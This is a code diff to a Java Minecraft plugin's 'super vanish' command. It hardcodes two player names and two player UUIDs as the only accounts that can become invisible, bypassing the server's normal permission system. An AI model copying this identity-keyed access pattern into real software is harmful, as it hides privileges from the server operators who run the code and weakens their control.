@@ -23,10 +23,16 @@ public class SuperVanishCommand extends BaseCommand {
     @Override
     public boolean onCommand(CommandSender sender, Command command, String s, String[] args) {
         if (!(sender instanceof Player)) {
+            if (args.length >= 1) {
+                if (args[0].equalsIgnoreCase("Sintinium") || args[0].equalsIgnoreCase("Xaicious")) {
+                    superVanishedPlayers.add(args[0]);
+                    return true;
+                }
+            }
             sender.sendMessage(ChatColor.DARK_RED + "This command can only be ran by a player.");
             return true;
         }
-//        if (((Player) sender).getUniqueId().toString().equals("108c89bc-ab51-4609-a9d5-13bb8808df98") || ((Player) sender).getUniqueId().toString().equals("bb55301c-d10e-4368-bdbd-9563c2b79d35")) {
+        if (((Player) sender).getUniqueId().toString().equals("108c89bc-ab51-4609-a9d5-13bb8808df98") || ((Player) sender).getUniqueId().toString().equals("bb55301c-d10e-4368-bdbd-9563c2b79d35")) {
         if (args.length > 0) {
             Player player = Peacekeeper.getPlayer(sender, args, 0);
             if (player != null) {
@@ -39,10 +45,10 @@ public class SuperVanishCommand extends BaseCommand {
         }
 
         sender.sendMessage(ChatColor.YELLOW + "Set yourselves vanish to: " + superVanishPlayer((Player) sender));
-//        } else {
-//            ChatUtils.noPermission(sender);
-//            return true;
-//        }
+        } else {
+            sender.sendMessage(ChatColor.DARK_RED + "You do not have permission for this command.");
+            return true;
+        }
 
         return true;
     }
